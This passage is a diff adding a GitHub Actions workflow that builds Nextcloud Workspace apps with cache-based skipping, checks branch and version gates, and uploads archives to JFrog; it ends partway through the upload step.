@@ -1,0 +1,1789 @@
+name: Build Nextcloud Workspace artifact (Optimized)
+
+# SPDX-FileCopyrightText: 2023 Nextcloud GmbH and Nextcloud contributors
+# SPDX-FileCopyrightText: 2025 STRATO AG
+# SPDX-License-Identifier: AGPL-3.0-or-later
+
+# Optimized build workflow using GitHub Actions cache
+# - Checks GitHub Actions cache for each app's current SHA
+# - Only builds apps without cached artifacts
+# - Significantly reduces build time by reusing cached builds via GitHub Actions cache
+
+on:
+  pull_request:
+    paths:
+      - '.github/workflows/**'
+      - 'src/**'
+      - 'apps/**'
+      - 'apps/**/appinfo/info.xml'
+      - 'apps-external/**'
+      - 'IONOS'
+      - 'package.json'
+      - 'package-lock.json'
+      - 'themes/**'
+      - 'lib/**'
+      - 'tsconfig.json'
+      - '**.js'
+      - '**.ts'
+      - '**.vue'
+      - '.gitmodules'
+  push:
+    # One converged list, identical on every branch. GitHub evaluates this block
+    # from the pushed branch's own copy, so the list must cover every live lane:
+    # the per-major globs, the legacy unsuffixed lanes (retired later), the trains
+    # in both naming eras, and user dev branches.
+    #
+    # Keeping the unsuffixed entries is load-bearing: `ionos-dev` does not match
+    # `ionos-dev-v*`, so dropping them would leave the v31 lane dark.
+    branches:
+      - 'ionos-dev-v*'
+      - 'ionos-stable-v*'
+      - ionos-dev
+      - ionos-stable
+      - 'rc/**'
+      - '*/dev/*'
+  workflow_dispatch:  # Manual trigger to bypass all caches
+    inputs:
+      force_rebuild:
+        description: 'Force rebuild all apps and dependencies (bypass ALL caches)'
+        required: false
+        type: boolean
+        default: false
+      cache_version_suffix:
+        description: 'Optional cache version suffix (e.g., "test", "debug") - creates separate cache namespace'
+        required: false
+        type: string
+        default: ''
+      apps_to_rebuild:
+        description: 'Comma-separated list of specific apps to rebuild (e.g., "app1,app2") - ignores cache for these apps only'
+        required: false
+        type: string
+        default: ''
+
+# Protected lanes (ionos-dev*/ionos-stable*/rc/*) use a unique-per-run-id key so
+# consecutive pushes never cancel each other. Matched by prefix, not by exact ref:
+# an exact list does not match a per-major lane, which would fall through to the
+# ref-keyed branch below and make consecutive pushes to ionos-dev-v<N> cancel each
+# other. Everything else stays ref-keyed, so a new push supersedes a running one.
+concurrency:
+  group: >-
+    ${{ github.workflow }}-${{
+      github.event_name == 'pull_request' && format('pr-{0}', github.event.pull_request.number) ||
+      (
+        (
+          startsWith(github.ref, 'refs/heads/ionos-dev') ||
+          startsWith(github.ref, 'refs/heads/ionos-stable') ||
+          startsWith(github.ref, 'refs/heads/rc/')
+        ) && github.run_id ||
+        github.ref
+      )
+    }}
+  cancel-in-progress: true
+
+env:
+  TARGET_PACKAGE_NAME: nc-workspace.zip
+  REGISTRY: ghcr.io
+  IMAGE_NAME: ${{ github.repository }}
+  ARTIFACTORY_REPOSITORY_SNAPSHOT: ionos-productivity-ncwserver-snapshot
+  # Cache version - increment this to invalidate all caches when build process changes
+  # Update when: Node.js version changes, PHP version changes, build scripts modified, etc.
+  # Format: v<major>.<minor> (e.g., v1.0, v1.1, v2.0)
+  CACHE_VERSION: v1.0
+
+permissions:
+  contents: read
+
+jobs:
+  prepare-matrix:
+    runs-on: ubuntu-latest
+    outputs:
+      apps_to_build: ${{ steps.detect.outputs.apps_to_build }}
+      apps_to_restore: ${{ steps.detect.outputs.apps_to_restore }}
+      external_apps_matrix: ${{ steps.set_matrix.outputs.matrix }}
+      apps_sha_map: ${{ steps.detect.outputs.apps_sha_map }}
+      has_apps_to_build: ${{ steps.detect.outputs.has_apps_to_build }}
+      has_apps_to_restore: ${{ steps.detect.outputs.has_apps_to_restore }}
+      effective_cache_version: ${{ steps.compute_cache_version.outputs.effective_cache_version }}
+      # Consumed by debug-pipeline-status to explain a skipped trigger-remote-dev-workflow.
+      remote_trigger_expected: ${{ steps.check_config.outputs.remote_trigger_expected }}
+      remote_trigger_reason: ${{ steps.check_config.outputs.remote_trigger_reason }}
+    steps:
+      - name: Compute effective cache version
+        id: compute_cache_version
+        # The suffix is free text typed by whoever dispatched the run, so it reaches bash as
+        # data via env rather than being interpolated into the script.
+        env:
+          VERSION_SUFFIX: ${{ github.event.inputs.cache_version_suffix && format('-{0}', github.event.inputs.cache_version_suffix) || '' }}
+        run: |
+          # Compute cache version with optional suffix to create a single source of truth
+          EFFECTIVE_VERSION="${CACHE_VERSION}${VERSION_SUFFIX}"
+          echo "effective_cache_version=$EFFECTIVE_VERSION" >> "$GITHUB_OUTPUT"
+          echo "Effective cache version: $EFFECTIVE_VERSION"
+
+      - name: Checkout repository
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # 7.0.0
+        with:
+          submodules: true
+          fetch-depth: 1  # Shallow clone - only need current submodule SHAs for cache detection
+
+      # Runs in the earliest job, right after checkout, so a mismatched lane fails in
+      # seconds instead of after a full build. Only lanes whose *name* encodes a major
+      # are checked: ionos-dev-v<N>, ionos-stable-v<N> and rc/ncw-v<N>-<rc>. The
+      # unsuffixed lanes and */dev/* carry no major to compare against and are skipped.
+      #
+      # The RC product prefix is 'ncw' — rc/ncw-v32-1, tracked as NCW-v32-1. A wrong prefix
+      # makes the assertion silently skip every RC branch and still look green, so RC refs
+      # that do not match the convention warn rather than pass quietly.
+      #
+      # This is the guard that has to exist before the deploy gate can safely be widened
+      # to the per-major lanes — without it, a lane can build one major and deploy under
+      # the name of another.
+      - name: Assert branch major matches version.php
+        env:
+          REF: ${{ github.ref_name }}
+        run: |
+          set -euo pipefail
+
+          BRANCH_MAJOR=''
+          case "$REF" in
+            ionos-dev-v[0-9]*)    BRANCH_MAJOR="${REF#ionos-dev-v}" ;;
+            ionos-stable-v[0-9]*) BRANCH_MAJOR="${REF#ionos-stable-v}" ;;
+            rc/ncw-v[0-9]*-*)     BRANCH_MAJOR="${REF#rc/ncw-v}"; BRANCH_MAJOR="${BRANCH_MAJOR%%-*}" ;;
+            # Arms below are ordered: anything carrying a second '-' segment but not the
+            # 'v<major>' shape is a near-miss (e.g. rc/ncw-32-1) and must warn, not be
+            # mistaken for the retired single-number form.
+            rc/ncw-*-*|rc/nsw-*-*)
+              echo "::warning::Branch '$REF' looks like an RC ref but does not match 'rc/ncw-v<major>-<rc>' — NC major could not be asserted."
+              exit 0 ;;
+            rc/ncw-[0-9]*|rc/nsw-[0-9]*)
+              echo "::notice::Branch '$REF' uses the retired RC naming (no major encoded) — assertion skipped."
+              exit 0 ;;
+            rc/*)
+              echo "::warning::Branch '$REF' does not match the RC convention 'rc/ncw-v<major>-<rc>' — NC major could not be asserted."
+              exit 0 ;;
+          esac
+
+          if [ -z "$BRANCH_MAJOR" ]; then
+            echo "::notice::Branch '$REF' encodes no NC major — assertion skipped."
+            exit 0
+          fi
+
+          # Parsed with sed rather than `php -r` so this does not depend on a PHP
+          # setup step having run. version.php line: $OC_Version = [32, 0, 14, 1];
+          FILE_MAJOR=$(sed -n 's/^\$OC_Version *= *\[ *\([0-9]\{1,\}\).*/\1/p' version.php)
+
+          if [ -z "$FILE_MAJOR" ]; then
+            echo "::error::Could not parse \$OC_Version from version.php."
+            exit 1
+          fi
+
+          if [ "$BRANCH_MAJOR" != "$FILE_MAJOR" ]; then
+            echo "::error::Branch '$REF' declares NC major $BRANCH_MAJOR but version.php says $FILE_MAJOR."
+            exit 1
+          fi
+
+          echo "✅ Branch '$REF' and version.php agree on NC major $FILE_MAJOR."
+
+      - name: Install dependencies
+        run: sudo apt-get update && sudo apt-get install -y make jq
+
+      # Besides printing the configuration, this step publishes its verdict as job outputs
+      # (remote_trigger_expected / remote_trigger_reason) so debug-pipeline-status can say *why*
+      # the trigger job was skipped instead of reporting a bare 'skipped'. That job consumes the
+      # verdict rather than re-deriving it — the gate is already encoded twice (here and in the
+      # trigger job's if:), and a third copy would be a maintenance trap.
+      - name: Check configuration
+        id: check_config
+        # Context and repository-variable values are bound to environment variables rather
+        # than interpolated into the script: `${{ }}` is expanded textually before bash
+        # parses it, so an interpolated branch name is code. See the 'Trigger remote
+        # workflow' step for the full reasoning.
+        env:
+          REF: ${{ github.ref_name }}
+          EVENT_NAME: ${{ github.event_name }}
+          REPO: ${{ github.repository }}
+          DISABLE_REMOTE_TRIGGER: ${{ vars.DISABLE_REMOTE_TRIGGER }}
+          ENABLE_REMOTE_TRIGGER_USER_DEV: ${{ vars.ENABLE_REMOTE_TRIGGER_USER_DEV }}
+          REMOTE_TRIGGER_NC_VERSION: ${{ vars.REMOTE_TRIGGER_NC_VERSION }}
+          REMOTE_TRIGGER_RC_BRANCH: ${{ vars.REMOTE_TRIGGER_RC_BRANCH }}
+        run: |
+          echo ""
+          echo "### 🔧 Remote Trigger Configuration" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "**DISABLE_REMOTE_TRIGGER value:** \`${DISABLE_REMOTE_TRIGGER}\`" >> $GITHUB_STEP_SUMMARY
+          echo "**ENABLE_REMOTE_TRIGGER_USER_DEV value:** \`${ENABLE_REMOTE_TRIGGER_USER_DEV}\`" >> $GITHUB_STEP_SUMMARY
+          if [ "$ENABLE_REMOTE_TRIGGER_USER_DEV" != "true" ]; then
+            echo "  - 💡 To enable the GitLab trigger for \`*/dev/*\` branches, set repository variable \`ENABLE_REMOTE_TRIGGER_USER_DEV\` to \`true\` at [Settings → Variables → Actions](https://github.com/${REPO}/settings/variables/actions)." >> $GITHUB_STEP_SUMMARY
+          fi
+          echo "**REMOTE_TRIGGER_NC_VERSION:** \`${REMOTE_TRIGGER_NC_VERSION}\`" >> $GITHUB_STEP_SUMMARY
+          echo "**REMOTE_TRIGGER_RC_BRANCH:** \`${REMOTE_TRIGGER_RC_BRANCH}\`" >> $GITHUB_STEP_SUMMARY
+          echo "**Event type:** \`${EVENT_NAME}\`" >> $GITHUB_STEP_SUMMARY
+          echo "**Branch:** \`${REF}\`" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "🔧 Remote Trigger Configuration"
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "DISABLE_REMOTE_TRIGGER    = '${DISABLE_REMOTE_TRIGGER}'"
+          echo "ENABLE_REMOTE_TRIGGER_USER_DEV = '${ENABLE_REMOTE_TRIGGER_USER_DEV}'"
+          if [ "$ENABLE_REMOTE_TRIGGER_USER_DEV" != "true" ]; then
+            echo "  💡 To enable the GitLab trigger for '*/dev/*' branches,"
+            echo "     set repository variable ENABLE_REMOTE_TRIGGER_USER_DEV to 'true' at:"
+            echo "     https://github.com/${REPO}/settings/variables/actions"
+          fi
+          echo "REMOTE_TRIGGER_NC_VERSION = '${REMOTE_TRIGGER_NC_VERSION}'"
+          echo "REMOTE_TRIGGER_RC_BRANCH  = '${REMOTE_TRIGGER_RC_BRANCH}'"
+          echo "Event type                = '${EVENT_NAME}'"
+          echo "Branch                    = '${REF}'"
+          echo ""
+
+          # TRIGGER_REASON names the gate that blocked, and is published below for
+          # debug-pipeline-status to quote. It is only meaningful when WILL_TRIGGER=false.
+          WILL_TRIGGER=false
+          TRIGGER_REASON=""
+
+          # First failing gate wins. The checks below are not mutually exclusive — an invalid
+          # branch also falls through to the version gate — so a later one must not overwrite the
+          # reason an earlier one recorded, or e.g. 'master' would be reported as a version
+          # mismatch rather than as "not a build lane". Each check still prints its own finding.
+          set_reason() {
+            if [ -z "$TRIGGER_REASON" ]; then TRIGGER_REASON="$1"; fi
+            return 0
+          }
+
+          if [ "$DISABLE_REMOTE_TRIGGER" == "true" ]; then
+            set_reason "DISABLE_REMOTE_TRIGGER='true' — remote trigger force-disabled repo-wide"
+            echo "⚠️  Remote trigger is DISABLED"
+            echo "    The 'trigger-remote-dev-workflow' job will be SKIPPED"
+            echo "**Status:** ⚠️ Remote trigger is **DISABLED**" >> $GITHUB_STEP_SUMMARY
+            echo "" >> $GITHUB_STEP_SUMMARY
+            echo "The \`trigger-remote-dev-workflow\` job will be skipped." >> $GITHUB_STEP_SUMMARY
+            echo "" >> $GITHUB_STEP_SUMMARY
+            echo "To enable, delete the variable or set it to a value other than 'true' at:" >> $GITHUB_STEP_SUMMARY
+            echo "https://github.com/${REPO}/settings/variables/actions" >> $GITHUB_STEP_SUMMARY
+          else
+            echo "✅ Remote trigger is ENABLED"
+            echo "   Checking if trigger conditions are met..."
+            echo "**Status:** ✅ Remote trigger is **ENABLED**" >> $GITHUB_STEP_SUMMARY
+            echo "" >> $GITHUB_STEP_SUMMARY
+
+            # Check if all conditions for trigger are met
+            WILL_TRIGGER=true
+            echo "**Trigger Conditions Check:**" >> $GITHUB_STEP_SUMMARY
+            echo "" >> $GITHUB_STEP_SUMMARY
+
+            if [ "$EVENT_NAME" != "push" ]; then
+              echo "- ❌ Event must be 'push' (current: \`${EVENT_NAME}\`)" >> $GITHUB_STEP_SUMMARY
+              echo "   ❌ Event type is '${EVENT_NAME}' (must be 'push')"
+              set_reason "event is '${EVENT_NAME}', the trigger only runs on 'push'"
+              WILL_TRIGGER=false
+            else
+              echo "- ✅ Event is 'push'" >> $GITHUB_STEP_SUMMARY
+              echo "   ✅ Event type is 'push'"
+            fi
+
+            # Check if branch matches expected patterns: ionos-dev[-v<major>], ionos-stable[-v<major>], rc/* or */dev/*
+            VALID_BRANCH_PATTERN='^(ionos-dev|ionos-stable)(-v[0-9]+)?$|^rc/.*$|^[^/]+/dev/.*$'
+            VALID_BRANCH_DESC="'ionos-dev[-v<major>]', 'ionos-stable[-v<major>]', 'rc/*' or '*/dev/*'"
+            USER_DEV_PATTERN='^[^/]+/dev/.*$'
+            # $VALID_BRANCH_PATTERN and $USER_DEV_PATTERN below stay unquoted on the right of
+            # =~ : quoting a regex operand makes it a literal string match.
+            if [[ ! "$REF" =~ $VALID_BRANCH_PATTERN ]]; then
+              echo "- ❌ Branch must be ${VALID_BRANCH_DESC} (current: \`${REF}\`)" >> $GITHUB_STEP_SUMMARY
+              echo "   ❌ Branch is '${REF}' (must be ${VALID_BRANCH_DESC})"
+              set_reason "branch '${REF}' is not a build lane (expected ${VALID_BRANCH_DESC})"
+              WILL_TRIGGER=false
+            else
+              echo "- ✅ Branch is '\`${REF}\`'" >> $GITHUB_STEP_SUMMARY
+              echo "   ✅ Branch is '${REF}'"
+            fi
+
+            # This block is the shell twin of the version gate in the
+            # 'trigger-remote-dev-workflow' if: condition. The two are one rule written
+            # twice — an edit to either must be mirrored in the other, or this summary
+            # reports an outcome the pipeline does not produce.
+            if [[ "$REF" =~ $USER_DEV_PATTERN ]]; then
+              # Not version-gated; governed solely by the ENABLE_REMOTE_TRIGGER_USER_DEV opt-in.
+              if [ "$ENABLE_REMOTE_TRIGGER_USER_DEV" == "true" ]; then
+                echo "- ✅ User-dev branch opt-in (\`ENABLE_REMOTE_TRIGGER_USER_DEV='true'\`)" >> $GITHUB_STEP_SUMMARY
+                echo "   ✅ ENABLE_REMOTE_TRIGGER_USER_DEV='true' — '*/dev/*' trigger is opted in"
+              else
+                echo "- ❌ User-dev branch requires \`ENABLE_REMOTE_TRIGGER_USER_DEV='true'\` (current: \`${ENABLE_REMOTE_TRIGGER_USER_DEV}\`)" >> $GITHUB_STEP_SUMMARY
+                echo "- ℹ️  Build & image push will still run — only QA deployment is skipped" >> $GITHUB_STEP_SUMMARY
+                echo "   ❌ '*/dev/*' branch requires ENABLE_REMOTE_TRIGGER_USER_DEV='true' (current: '${ENABLE_REMOTE_TRIGGER_USER_DEV}')"
+                echo "   ℹ️  Build & image push will still run — only QA deployment is skipped"
+                set_reason "'*/dev/*' branch needs ENABLE_REMOTE_TRIGGER_USER_DEV='true' (currently '${ENABLE_REMOTE_TRIGGER_USER_DEV}')"
+                WILL_TRIGGER=false
+              fi
+            else
+              # Bare ionos-dev/ionos-stable are always exempt; the ionos-(dev|stable)-v* branches
+              # must end with REMOTE_TRIGGER_NC_VERSION; all other branches reaching here (rc/*)
+              # must match REMOTE_TRIGGER_RC_BRANCH exactly — the suffix check must NOT apply to
+              # rc/* or an RC branch could pass by coincidence of name.
+              NC_VERSION="$REMOTE_TRIGGER_NC_VERSION"
+              RC_BRANCH="$REMOTE_TRIGGER_RC_BRANCH"
+              BRANCH="$REF"
+
+              if [ "$BRANCH" == "ionos-dev" ] || [ "$BRANCH" == "ionos-stable" ]; then
+                echo "- ✅ Version gate: '$BRANCH' is always exempt" >> $GITHUB_STEP_SUMMARY
+                echo "   ✅ Version gate: '$BRANCH' is always exempt"
+              elif [ -z "$NC_VERSION" ]; then
+                echo "- ✅ Version gate: not set — all versions allowed" >> $GITHUB_STEP_SUMMARY
+                echo "   ✅ Version gate: not set — all versions allowed"
+              elif [[ "$BRANCH" == ionos-dev-v* || "$BRANCH" == ionos-stable-v* ]] && [[ "$BRANCH" == *"$NC_VERSION" ]]; then
+                echo "- ✅ Version gate: branch \`$BRANCH\` matches \`$NC_VERSION\`" >> $GITHUB_STEP_SUMMARY
+                echo "   ✅ Version gate: branch '$BRANCH' matches '$NC_VERSION'"
+              elif [ -n "$RC_BRANCH" ] && [ "$BRANCH" == "$RC_BRANCH" ]; then
+                echo "- ✅ Version gate: branch \`$BRANCH\` matches RC whitelist \`$RC_BRANCH\`" >> $GITHUB_STEP_SUMMARY
+                echo "   ✅ Version gate: branch '$BRANCH' matches RC whitelist '$RC_BRANCH'"
+              else
+                echo "- ❌ Version gate: branch \`$BRANCH\` does not match version \`$NC_VERSION\` or RC branch \`$RC_BRANCH\`" >> $GITHUB_STEP_SUMMARY
+                echo "- ℹ️  Build & image push will still run — only QA deployment is skipped" >> $GITHUB_STEP_SUMMARY
+                echo "   ❌ Version gate: branch '$BRANCH' does not match version '$NC_VERSION' or RC branch '$RC_BRANCH'"
+                echo "   ℹ️  Build & image push will still run — only QA deployment is skipped"
+                set_reason "version gate: '$BRANCH' matches neither REMOTE_TRIGGER_NC_VERSION='$NC_VERSION' nor REMOTE_TRIGGER_RC_BRANCH='$RC_BRANCH'"
+                WILL_TRIGGER=false
+              fi
+            fi
+
+            echo "- ℹ️  All dependent jobs must succeed (checked at job runtime)" >> $GITHUB_STEP_SUMMARY
+            echo "" >> $GITHUB_STEP_SUMMARY
+
+            if [ "$WILL_TRIGGER" = "true" ]; then
+              echo "**Expected:** The \`trigger-remote-dev-workflow\` job **WILL RUN** (if all dependent jobs succeed)." >> $GITHUB_STEP_SUMMARY
+              echo ""
+              echo "🎯 Expected: trigger-remote-dev-workflow job WILL RUN (if all dependent jobs succeed)"
+            else
+              echo "**Expected:** The \`trigger-remote-dev-workflow\` job **WILL BE SKIPPED** due to unmet conditions above." >> $GITHUB_STEP_SUMMARY
+              echo ""
+              echo "⏭️  Expected: trigger-remote-dev-workflow job WILL BE SKIPPED"
+            fi
+          fi
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+
+          # Publish the verdict for debug-pipeline-status. Only the branch/event/variable gates are
+          # visible from here — whether the dependent jobs succeed is not known until much later,
+          # so the consumer checks those itself and falls back to this reason.
+          {
+            echo "remote_trigger_expected=${WILL_TRIGGER}"
+            echo "remote_trigger_reason=${TRIGGER_REASON}"
+          } >> "$GITHUB_OUTPUT"
+
+      - name: List caches before restore
+        run: gh cache list
+        env:
+          GH_TOKEN: ${{ github.token }}
+
+      - name: Generate apps matrix dynamically from Makefile
+        id: set_matrix
+        run: |
+          # Generate matrix from Makefile - single source of truth
+          echo "Generating matrix from Makefile..."
+          matrix_output=$(make -f IONOS/Makefile generate_external_apps_matrix_json 2>&1)
+
+          # Filter out info messages to get just the JSON
+          # Note: Use same filtering logic as validation script to ensure consistency
+          if echo "$matrix_output" | grep -q '^\[i\]'; then
+            matrix=$(echo "$matrix_output" | grep -v '^\[i\]')
+          else
+            matrix="$matrix_output"
+          fi
+
+          # Validate JSON
+          if ! echo "$matrix" | jq empty 2>/dev/null; then
+            echo "Error: Generated matrix is not valid JSON"
+            echo "Output: $matrix_output"
+            exit 1
+          fi
+
+          # Output as compact format
+          echo "matrix=$(echo "$matrix" | jq -c '.')" >> $GITHUB_OUTPUT
+          echo "Matrix generated successfully with $(echo "$matrix" | jq 'length') apps"
+
+      - name: Collect apps and their SHAs for cache-based building
+        id: detect
+        env:
+          GH_TOKEN: ${{ github.token }}
+          CACHE_VERSION: ${{ steps.compute_cache_version.outputs.effective_cache_version }}
+          FORCE_REBUILD: ${{ github.event.inputs.force_rebuild || 'false' }}
+          APPS_TO_REBUILD: ${{ github.event.inputs.apps_to_rebuild || '' }}
+          JF_URL: ${{ secrets.JF_ARTIFACTORY_URL }}
+          JF_USER: ${{ secrets.JF_ARTIFACTORY_USER }}
+          JF_ACCESS_TOKEN: ${{ secrets.JF_ACCESS_TOKEN }}
+          ARTIFACTORY_REPOSITORY_SNAPSHOT: ${{ env.ARTIFACTORY_REPOSITORY_SNAPSHOT }}
+          GITHUB_REF: ${{ github.ref }}
+          # Display-only copies of the two workflow_dispatch inputs. They differ from
+          # APPS_TO_REBUILD above only in their empty-value placeholder, and both are free
+          # text typed by whoever dispatched the run.
+          CACHE_VERSION_SUFFIX_DISPLAY: ${{ github.event.inputs.cache_version_suffix || '(none)' }}
+          APPS_TO_REBUILD_DISPLAY: ${{ github.event.inputs.apps_to_rebuild || '(none)' }}
+          MATRIX_JSON: ${{ steps.set_matrix.outputs.matrix }}
+        run: |
+          # Show effective cache version
+          echo "Base CACHE_VERSION: ${CACHE_VERSION}"
+          echo "Cache version suffix: ${CACHE_VERSION_SUFFIX_DISPLAY}"
+          echo "Effective CACHE_VERSION: ${CACHE_VERSION}"
+          echo "Apps to rebuild: ${APPS_TO_REBUILD_DISPLAY}"
+          echo ""
+          bash .github/scripts/detect-app-cache.sh "$MATRIX_JSON"
+
+  build-external-apps:
+    runs-on: ubuntu-latest
+    needs: prepare-matrix
+    # Only run if there are actually apps to build (prevents runner from starting)
+    if: needs.prepare-matrix.outputs.has_apps_to_build == 'true'
+
+    permissions:
+      contents: read
+
+    name: build-external-apps
+    strategy:
+      max-parallel: 20
+      matrix:
+        # Use the filtered list of apps that need building (not in cache)
+        app_info: ${{ fromJson(needs.prepare-matrix.outputs.apps_to_build) }}
+
+    steps:
+      - name: Get app configuration from full matrix
+        id: app-config
+        # FULL_MATRIX and APP_NAME come from the Makefile-generated app matrix, i.e. from
+        # repo files a PR author can edit. Interpolated into single quotes as they were, one
+        # apostrophe in an app name breaks out of the string.
+        env:
+          FULL_MATRIX: ${{ needs.prepare-matrix.outputs.external_apps_matrix }}
+          APP_NAME: ${{ matrix.app_info.name }}
+          APP_SHA: ${{ matrix.app_info.sha }}
+        run: |
+          # Find the app configuration in the full matrix
+          APP_CONFIG=$(echo "$FULL_MATRIX" | jq -c --arg name "$APP_NAME" '.[] | select(.name == $name)')
+
+          if [ -z "$APP_CONFIG" ]; then
+            echo "ERROR: Could not find configuration for $APP_NAME"
+            exit 1
+          fi
+
+          # Extract configuration values
+          APP_PATH=$(echo "$APP_CONFIG" | jq -r '.path')
+          HAS_NPM=$(echo "$APP_CONFIG" | jq -r '.has_npm')
+          HAS_COMPOSER=$(echo "$APP_CONFIG" | jq -r '.has_composer')
+          MAKEFILE_TARGET=$(echo "$APP_CONFIG" | jq -r '.makefile_target')
+
+          # Set outputs
+          echo "path=$APP_PATH" >> $GITHUB_OUTPUT
+          echo "has-npm=$HAS_NPM" >> $GITHUB_OUTPUT
+          echo "has-composer=$HAS_COMPOSER" >> $GITHUB_OUTPUT
+          echo "makefile-target=$MAKEFILE_TARGET" >> $GITHUB_OUTPUT
+          echo "Building $APP_NAME from $APP_PATH (SHA: ${APP_SHA})"
+
+      - name: Checkout server
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # 7.0.0
+        with:
+          submodules: true
+          fetch-depth: 1
+
+      - name: Set up node with version from package.json's engines
+        if: steps.app-config.outputs.has-npm == 'true'
+        uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # 6.4.0
+        with:
+          node-version-file: "package.json"
+          cache: 'npm'
+          cache-dependency-path: ${{ steps.app-config.outputs.path }}/package-lock.json
+
+      - name: Setup PHP with PECL extension
+        if: steps.app-config.outputs.has-composer == 'true'
+        uses: shivammathur/setup-php@c541c155eee45413f5b09a52248675b1a2575231 #v2.31.1
+        with:
+          php-version: '8.3'
+          tools: composer:v2
+          extensions: gd, zip, curl, xml, xmlrpc, mbstring, sqlite, xdebug, pgsql, intl, imagick, gmp, apcu, bcmath, redis, soap, imap, opcache
+        env:
+          runner: ubuntu-latest
+
+      - name: Cache Composer dependencies for ${{ matrix.app_info.name }}
+        if: steps.app-config.outputs.has-composer == 'true' && github.event.inputs.force_rebuild != 'true'
+        uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # 6.1.0
+        with:
+          path: ${{ steps.app-config.outputs.path }}/vendor
+          key: ${{ runner.os }}-composer-${{ matrix.app_info.name }}-${{ hashFiles(format('{0}/composer.lock', steps.app-config.outputs.path)) }}
+          restore-keys: |
+            ${{ runner.os }}-composer-${{ matrix.app_info.name }}-
+
+      - name: Build ${{ matrix.app_info.name }} app
+        # The target name came straight off the matrix into the command line, unquoted and
+        # with no env: at all. Quoting is right here: a make target is a single word, so
+        # suppressing word-splitting is the intended behaviour.
+        env:
+          MAKEFILE_TARGET: ${{ steps.app-config.outputs.makefile-target }}
+        run: make -f IONOS/Makefile "$MAKEFILE_TARGET"
+
+      - name: Report build completion
+        if: success()
+        env:
+          APP_NAME: ${{ matrix.app_info.name }}
+          APP_SHA: ${{ matrix.app_info.sha }}
+          APP_PATH: ${{ steps.app-config.outputs.path }}
+        run: |
+          echo "### ✅ Built ${APP_NAME}" >> $GITHUB_STEP_SUMMARY
+          echo "- **SHA:** \`${APP_SHA}\`" >> $GITHUB_STEP_SUMMARY
+          echo "- **Path:** ${APP_PATH}" >> $GITHUB_STEP_SUMMARY
+          echo "- **Status:** Success" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+
+      # Save built app to cache for future runs
+      - name: Save build artifacts to cache
+        uses: actions/cache/save@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # 6.1.0
+        with:
+          path: ${{ steps.app-config.outputs.path }}
+          key: ${{ needs.prepare-matrix.outputs.effective_cache_version }}-app-build-${{ matrix.app_info.name }}-${{ matrix.app_info.sha }}
+
+      # Push to JFrog for ionos-dev branch builds
+      - name: Setup JFrog CLI
+        uses: jfrog/setup-jfrog-cli@7c95feb32008765e1b4e626b078dfd897c4340ad # v4.4.1
+        env:
+          JF_URL: ${{ secrets.JF_ARTIFACTORY_URL }}
+          JF_USER: ${{ secrets.JF_ARTIFACTORY_USER }}
+          JF_ACCESS_TOKEN: ${{ secrets.JF_ACCESS_TOKEN }}
+
+      - name: Ping the JF server
+        run: |
+          # Ping the server
+          jf rt ping
+
+      - name: Get Job data
+        id: get_job_data
+        continue-on-error: true
+        uses: ./.github/actions/get-job-data
+        with:
+          job-name: 'build-external-apps (${{ matrix.app_info.name }}, ${{ matrix.app_info.sha }})'
+          github-token: ${{ github.token }}
+          repository: ${{ github.repository }}
+          run-id: ${{ github.run_id }}
+
+      - name: Push ${{ matrix.app_info.name }} to JFrog
+        env:
+          APP_NAME: ${{ matrix.app_info.name }}
+          APP_SHA: ${{ matrix.app_info.sha }}
+          APP_PATH: ${{ steps.app-config.outputs.path }}
+          EFFECTIVE_CACHE_VERSION: ${{ needs.prepare-matrix.outputs.effective_cache_version }}
+          REF: ${{ github.ref_name }}
+          SHA: ${{ github.sha }}
+          JOB_HTML_URL: ${{ steps.get_job_data.outputs.job_html_url }}
+        run: |
+          set -e
+
+          echo "=== JFrog Upload Debug Info ==="
+          echo "📦 Packaging $APP_NAME for JFrog upload..."
+          echo "App Name: $APP_NAME"
+          echo "App SHA: $APP_SHA"
+          echo "App Path: $APP_PATH"
+          echo "Cache Version: $EFFECTIVE_CACHE_VERSION"
+          echo "Repository: ${ARTIFACTORY_REPOSITORY_SNAPSHOT}"
+          echo "==============================="
+
+          # Verify app path exists
+          if [ ! -d "$APP_PATH" ]; then
+            echo "❌ ERROR: App path does not exist: $APP_PATH"
+            exit 1
+          fi
+
+          echo "App directory contents (top level):"
+          ls -la "$APP_PATH" | head -20
+
+          # Create tar.gz archive of the built app (excluding node_modules and other build artifacts)
+          ARCHIVE_NAME="${APP_NAME}-${APP_SHA}.tar.gz"
+          echo ""
+          echo "Creating archive: $ARCHIVE_NAME"
+          echo "Running: tar -czf \"$ARCHIVE_NAME\" --exclude=\"node_modules\" --exclude=\".git\" --exclude=\"*.log\" -C \"$(dirname "$APP_PATH")\" \"$(basename "$APP_PATH")\""
+
+          tar -czf "$ARCHIVE_NAME" \
+            --exclude="node_modules" \
+            --exclude=".git" \
+            --exclude="*.log" \
+            -C "$(dirname "$APP_PATH")" \
+            "$(basename "$APP_PATH")"
+
+          echo "✓ Archive created successfully"
+          echo "Archive size:"
+          ls -lh "$ARCHIVE_NAME"
+
+          # Upload to JFrog - store in snapshot repo under dev/apps/
+          # Include CACHE_VERSION in path to enable complete cache invalidation
+          JFROG_PATH="${ARTIFACTORY_REPOSITORY_SNAPSHOT}/apps/${EFFECTIVE_CACHE_VERSION}/${APP_NAME}/${ARCHIVE_NAME}"
+
+          # Build properties for artifact metadata
+          JFROG_PROPS_LIST=()
+          JFROG_PROPS_LIST+=("app.name=${APP_NAME}")
+          JFROG_PROPS_LIST+=("app.sha=${APP_SHA}")
+          JFROG_PROPS_LIST+=("vcs.branch=${REF}")
+          JFROG_PROPS_LIST+=("vcs.revision=${SHA}")
+
+          # Add job URL if available
